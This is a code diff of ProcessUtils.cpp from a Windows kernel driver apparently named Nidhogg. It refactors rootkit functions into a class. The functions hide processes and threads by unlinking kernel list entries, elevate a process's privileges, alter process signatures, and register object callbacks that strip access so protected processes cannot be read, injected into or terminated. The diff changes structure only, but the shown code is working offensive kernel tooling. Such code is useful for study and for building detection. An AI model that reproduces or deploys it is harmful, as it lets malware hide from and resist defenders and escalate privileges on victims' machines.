@@ -1,6 +1,28 @@
 #include "pch.h"
 #include "ProcessUtils.hpp"
 
+ProcessUtils::ProcessUtils() {
+	this->HiddenProcesses.PidsCount = 0;
+	this->ProtectedProcesses.PidsCount = 0;
+	memset(&this->ProtectedProcesses, 0, sizeof(this->ProtectedProcesses));
+
+	for (ULONG i = 0; i < MAX_PIDS; i++) {
+		this->HiddenProcesses.Processes[i].ListEntry = NULL;
+		this->HiddenProcesses.Processes[i].Pid = 0;
+	}
+	this->ProcessesLock.Init();
+
+	this->ProtectedThreads.TidsCount = 0;
+	memset(&this->ProtectedThreads, 0, sizeof(this->ProtectedThreads));
+	this->ThreadsLock.Init();
+}
+
+ProcessUtils::~ProcessUtils() {
+	ClearProtectedProcesses();
+	ClearHiddenProcesses();
+	ClearProtectedThreads();
+}
+
 /*
 * Description:
 * OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
@@ -18,17 +40,17 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPE
 	if (Info->KernelHandle)
 		return OB_PREOP_SUCCESS;
 
-	if (pGlobals.ProtectedProcesses.PidsCount == 0)
+	if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0)
 		return OB_PREOP_SUCCESS;
 
 	auto Process = (PEPROCESS)Info->Object;
 	auto pid = HandleToULong(PsGetProcessId(Process));
 
 
-	AutoLock locker(pGlobals.Lock);
+	AutoLock locker(NidhoggProccessUtils->GetProcessesLock());
 
 	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
-	if (FindProcess(pid)) {
+	if (NidhoggProccessUtils->FindProcess(pid)) {
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
@@ -56,7 +78,7 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPER
 	if (Info->KernelHandle)
 		return OB_PREOP_SUCCESS;
 
-	if (tGlobals.ProtectedThreads.TidsCount == 0)
+	if (NidhoggProccessUtils->GetProtectedThreadsCount() == 0)
 		return OB_PREOP_SUCCESS;
 
 	PETHREAD thread = (PETHREAD)Info->Object;
@@ -69,10 +91,10 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPER
 		return OB_PREOP_SUCCESS;
 
 
-	AutoLock locker(tGlobals.Lock);
+	AutoLock locker(NidhoggProccessUtils->GetThreadsLock());
 
 	// If the process was found on the list, remove permissions for terminating / setting context / suspending the thread.
-	if (FindThread(tid)) {
+	if (NidhoggProccessUtils->FindThread(tid)) {
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE;
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SUSPEND_RESUME;
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SET_CONTEXT;
@@ -91,7 +113,7 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPER
 * Returns:
 * @status [NTSTATUS] -- Whether successfully hidden or not.
 */
-NTSTATUS HideProcess(ULONG pid) {
+NTSTATUS ProcessUtils::HideProcess(ULONG pid) {
 	PEPROCESS targetProcess;
 	NTSTATUS status = STATUS_SUCCESS;
 	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
@@ -109,7 +131,7 @@ NTSTATUS HideProcess(ULONG pid) {
 
 	// Using the ActiveProcessLinks lock to avoid accessing problems.
 	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
-	AutoLock locker(pGlobals.Lock);
+	AutoLock locker(this->ProcessesLock);
 	ExAcquirePushLockExclusive(listLock);
 
 	// Saving the hidden process' list entry for the future to release it.
@@ -136,12 +158,12 @@ NTSTATUS HideProcess(ULONG pid) {
 * Returns:
 * @status [NTSTATUS] -- Whether successfully hidden or not.
 */
-NTSTATUS UnhideProcess(ULONG pid) {
+NTSTATUS ProcessUtils::UnhideProcess(ULONG pid) {
 	PEPROCESS targetProcess;
 	NTSTATUS status = STATUS_SUCCESS;
 	PLIST_ENTRY entryToRestore;
 
-	AutoLock locker(pGlobals.Lock);
+	AutoLock locker(this->ProcessesLock);
 	entryToRestore = GetHiddenProcess(pid);
 
 	if (!entryToRestore)
@@ -182,7 +204,7 @@ NTSTATUS UnhideProcess(ULONG pid) {
 * Returns:
 * @status [NTSTATUS] -- Whether successfully hidden or not.
 */
-NTSTATUS HideThread(ULONG tid) {
+NTSTATUS ProcessUtils::HideThread(ULONG tid) {
 	PETHREAD targetThread;
 	NTSTATUS status = STATUS_SUCCESS;
 	ULONG threadListEntryOffset = GetThreadListEntryOffset();
@@ -218,7 +240,7 @@ NTSTATUS HideThread(ULONG tid) {
 * Returns:
 * @status [NTSTATUS] -- Whether successfully elevated or not.
 */
-NTSTATUS ElevateProcess(ULONG pid) {
+NTSTATUS ProcessUtils::ElevateProcess(ULONG pid) {
 	PEPROCESS privilegedProcess, targetProcess;
 	NTSTATUS status = STATUS_SUCCESS;
 
@@ -254,12 +276,12 @@ NTSTATUS ElevateProcess(ULONG pid) {
 * Returns:
 * @status [bool]  -- Whether successfully added or not.
 */
-bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
+bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
 	for (int i = 0; i < MAX_PIDS; i++) {
-		if (pGlobals.HiddenProcesses.Processes[i].Pid == 0) {
-			pGlobals.HiddenProcesses.Processes[i].ListEntry = entry;
-			pGlobals.HiddenProcesses.Processes[i].Pid = pid;
-			pGlobals.HiddenProcesses.PidsCount++;
+		if (this->HiddenProcesses.Processes[i].Pid == 0) {
+			this->HiddenProcesses.Processes[i].ListEntry = entry;
+			this->HiddenProcesses.Processes[i].Pid = pid;
+			this->HiddenProcesses.PidsCount++;
 			return true;
 		}
 	}
@@ -276,14 +298,14 @@ bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
 * Returns:
 * @entry  [PLIST_ENTRY] -- If found, the process list entry.
 */
-PLIST_ENTRY GetHiddenProcess(DWORD pid) {
+PLIST_ENTRY ProcessUtils::GetHiddenProcess(DWORD pid) {
 	PLIST_ENTRY entry = NULL;
 
-	for (int i = 0; i < pGlobals.HiddenProcesses.PidsCount; i++) {
-		if (pGlobals.HiddenProcesses.Processes[i].Pid == pid) {
-			entry = pGlobals.HiddenProcesses.Processes[i].ListEntry;
-			pGlobals.HiddenProcesses.Processes[i].Pid = 0;
-			pGlobals.HiddenProcesses.PidsCount--;
+	for (ULONG i = 0; i < this->HiddenProcesses.PidsCount; i++) {
+		if (this->HiddenProcesses.Processes[i].Pid == pid) {
+			entry = this->HiddenProcesses.Processes[i].ListEntry;
+			this->HiddenProcesses.Processes[i].Pid = 0;
+			this->HiddenProcesses.PidsCount--;
 			break;
 		}
 	}
@@ -300,9 +322,9 @@ PLIST_ENTRY GetHiddenProcess(DWORD pid) {
 * Returns:
 * @status [bool]  -- Whether found or not.
 */
-bool FindProcess(ULONG pid) {
-	for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++)
-		if (pGlobals.ProtectedProcesses.Processes[i] == pid)
+bool ProcessUtils::FindProcess(ULONG pid) {
+	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++)
+		if (this->ProtectedProcesses.Processes[i] == pid)
 			return true;
 	return false;
 }
@@ -317,11 +339,11 @@ bool FindProcess(ULONG pid) {
 * Returns:
 * @status [bool]  -- Whether successfully added or not.
 */
-bool AddProcess(ULONG pid) {
-	for (int i = 0; i < MAX_PIDS; i++)
-		if (pGlobals.ProtectedProcesses.Processes[i] == 0) {
-			pGlobals.ProtectedProcesses.Processes[i] = pid;
-			pGlobals.ProtectedProcesses.PidsCount++;
+bool ProcessUtils::AddProcess(ULONG pid) {
+	for (ULONG i = 0; i < MAX_PIDS; i++)
+		if (this->ProtectedProcesses.Processes[i] == 0) {
+			this->ProtectedProcesses.Processes[i] = pid;
+			this->ProtectedProcesses.PidsCount++;
 			return true;
 		}
 	return false;
@@ -337,11 +359,11 @@ bool AddProcess(ULONG pid) {
 * Returns:
 * @status [bool]  -- Whether successfully removed or not.
 */
-bool RemoveProcess(ULONG pid) {
-	for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++)
-		if (pGlobals.ProtectedProcesses.Processes[i] == pid) {
-			pGlobals.ProtectedProcesses.Processes[i] = 0;
-			pGlobals.ProtectedProcesses.PidsCount--;
+bool ProcessUtils::RemoveProcess(ULONG pid) {
+	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++)
+		if (this->ProtectedProcesses.Processes[i] == pid) {
+			this->ProtectedProcesses.Processes[i] = 0;
+			this->ProtectedProcesses.PidsCount--;
 			return true;
 		}
 	return false;
@@ -357,9 +379,9 @@ bool RemoveProcess(ULONG pid) {
 * Returns:
 * @status [bool]  -- Whether found or not.
 */
-bool FindThread(ULONG tid) {
-	for (int i = 0; i < tGlobals.ProtectedThreads.TidsCount; i++)
-		if (tGlobals.ProtectedThreads.Threads[i] == tid)
+bool ProcessUtils::FindThread(ULONG tid) {
+	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++)
+		if (this->ProtectedThreads.Threads[i] == tid)
 			return true;
 	return false;
 }
@@ -374,11 +396,11 @@ bool FindThread(ULONG tid) {
 * Returns:
 * @status [bool]  -- Whether successfully added or not.
 */
-bool AddThread(ULONG tid) {
-	for (int i = 0; i < MAX_TIDS; i++)
-		if (tGlobals.ProtectedThreads.Threads[i] == 0) {
-			tGlobals.ProtectedThreads.Threads[i] = tid;
-			tGlobals.ProtectedThreads.TidsCount++;
+bool ProcessUtils::AddThread(ULONG tid) {
+	for (ULONG i = 0; i < MAX_TIDS; i++)
+		if (this->ProtectedThreads.Threads[i] == 0) {
+			this->ProtectedThreads.Threads[i] = tid;
+			this->ProtectedThreads.TidsCount++;
 			return true;
 		}
 	return false;
@@ -394,11 +416,11 @@ bool AddThread(ULONG tid) {
 * Returns:
 * @status [bool]  -- Whether successfully removed or not.
 */
-bool RemoveThread(ULONG tid) {
-	for (int i = 0; i < tGlobals.ProtectedThreads.TidsCount; i++)
-		if (tGlobals.ProtectedThreads.Threads[i] == tid) {
-			tGlobals.ProtectedThreads.Threads[i] = 0;
-			tGlobals.ProtectedThreads.TidsCount--;
+bool ProcessUtils::RemoveThread(ULONG tid) {
+	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++)
+		if (this->ProtectedThreads.Threads[i] == tid) {
+			this->ProtectedThreads.Threads[i] = 0;
+			this->ProtectedThreads.TidsCount--;
 			return true;
 		}
 	return false;
@@ -415,7 +437,7 @@ bool RemoveThread(ULONG tid) {
 * Returns:
 * There is no return value.
 */
-void RemoveListLinks(PLIST_ENTRY current) {
+void ProcessUtils::RemoveListLinks(PLIST_ENTRY current) {
 	PLIST_ENTRY previous;
 	PLIST_ENTRY next;
 
@@ -440,7 +462,7 @@ void RemoveListLinks(PLIST_ENTRY current) {
 * Returns:
 * There is no return value.
 */
-void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
+void ProcessUtils::AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
 	PLIST_ENTRY next;
 
 	next = target->Flink;
@@ -463,7 +485,7 @@ void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
 * Returns:
 * @status  [NTSTATUS] -- Whether the operation was successful or not.
 */
-NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature) {
+NTSTATUS ProcessUtils::SetProcessSignature(ProcessSignature* ProcessSignature) {
 	PEPROCESS process;
 	NTSTATUS status = STATUS_SUCCESS;
 
@@ -481,4 +503,96 @@ NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature) {
 
 	ObDereferenceObject(process);
 	return status;
+}
+
+/*
+* Description:
+* ClearProtectedProcesses is responsible for cleaning the protected processes array.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void ProcessUtils::ClearProtectedProcesses() {
+	AutoLock locker(this->ProcessesLock);
+
+	memset(&this->ProtectedProcesses.Processes, 0, sizeof(this->ProtectedProcesses.Processes));
+	this->ProtectedProcesses.PidsCount = 0;
+}
+
+/*
+* Description:
+* ClearHiddenProcesses is responsible for cleaning the hidden processes array.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void ProcessUtils::ClearHiddenProcesses() {
+	AutoLock locker(this->ProcessesLock);
+
+	for (ULONG i = 0; i < this->HiddenProcesses.PidsCount; i++) {
+		this->HiddenProcesses.Processes[i].ListEntry = NULL;
+		this->HiddenProcesses.Processes[i].Pid = 0;
+	}
+	this->HiddenProcesses.PidsCount = 0;
+}
+
+/*
+* Description:
+* ClearProtectedThreads is responsible for cleaning the protected threads array.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void ProcessUtils::ClearProtectedThreads() {
+	AutoLock locker(this->ThreadsLock);
+
+	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads));
+	this->ProtectedThreads.TidsCount = 0;
+}
+
+/*
+* Description:
+* QueryProtectedProcesses is responsible for returning a list of protected processes.
+*
+* Parameters:
+* @list [ProtectedProcessesList*] -- Output protected processes list.
+*
+* Returns:
+* There is no return value.
+*/
+void ProcessUtils::QueryProtectedProcesses(ProtectedProcessesList* list) {
+	AutoLock locker(this->ProcessesLock);
+	list->PidsCount = this->ProtectedProcesses.PidsCount;
+
+	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++) {
+		list->Processes[i] = this->ProtectedProcesses.Processes[i];
+	}
+}
+
+/*
+* Description:
+* QueryProtectedThreads is responsible for returning a list of protected threads.
+*
+* Parameters:
+* @list [ThreadsList*] -- Output protected threads list.
+*
+* Returns:
+* There is no return value.
+*/
+void ProcessUtils::QueryProtectedThreads(ThreadsList* list) {
+	AutoLock locker(this->ThreadsLock);
+	list->TidsCount = this->ProtectedThreads.TidsCount;
+
+	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++) {
+		list->Threads[i] = this->ProtectedThreads.Threads[i];
+	}
 }
